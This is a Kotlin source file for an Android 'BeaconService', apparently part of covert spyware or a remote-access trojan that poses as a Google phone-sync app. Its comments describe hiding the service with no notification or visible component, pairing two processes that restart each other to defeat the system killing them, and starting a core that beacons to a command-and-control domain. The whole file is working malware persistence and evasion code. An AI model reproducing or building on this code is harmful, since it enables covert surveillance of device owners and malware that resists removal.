package com.shadow

import android.app.Service
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.ServiceConnection
import android.os.Binder
import android.os.IBinder
import android.util.Log
import com.google.android.phonesync.BuildConfig

/**
 * The beacon host, declared in the ":sync" process (android:process=":sync" in the
 * manifest). It exists purely to hold the beacon in a SEPARATE Android process from
 * the main one, so a per-process reap only takes one of us, and the mutual binding
 * brings it back in under a second.
 *
 * Bound service — no notification, no foreground, no visible component. SyncManager
 * and the main process both bind here to keep it alive.
 */
class BeaconService : Service() {

    private val binder = LocalBinder()

    inner class LocalBinder : Binder() {
        fun service(): BeaconService = this@BeaconService
    }

    /** Bind back to the main process, with backoff, so the pair stays mutual. */
    private val mainConn = object : ServiceConnection {
        override fun onServiceConnected(name: ComponentName?, b: IBinder?) {
            Log.i(TAG, ":sync bound to main process")
        }

        override fun onServiceDisconnected(name: ComponentName?) {
            Log.w(TAG, "main disconnected — rebinding")
            bindBackToMain(2000L)
        }
    }

    private fun bindBackToMain(delayMs: Long = 0L) {
        val doBind = {
            runCatching {
                val intent = Intent().setComponent(
                    ComponentName(packageName, MainKeepAliveService::class.java.name)
                )
                applicationContext.bindService(intent, mainConn, Context.BIND_AUTO_CREATE)
            }
        }
        if (delayMs > 0L) {
            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(doBind, delayMs)
        } else {
            doBind()
        }
    }

    override fun onCreate() {
        super.onCreate()
        Log.i(TAG, ":sync beacon process up (pid=${android.os.Process.myPid()})")
        // Start the core in THIS process — the beacon lives here, not in the main one.
        try {
            ShadowCore.start(applicationContext, BuildConfig.C2_DOMAIN)
        } catch (e: Throwable) {
            Log.w(TAG, "core start in :sync failed: ${e.message}")
        }
        // Bind back to the main process so it is held up by us, exactly as we are
        // held up by it. This is the mutual half of the resurrection pair.
        bindBackToMain()
    }

    override fun onBind(intent: Intent?): IBinder? = binder

    companion object {
        private const val TAG = "ShadowBeacon"
    }
}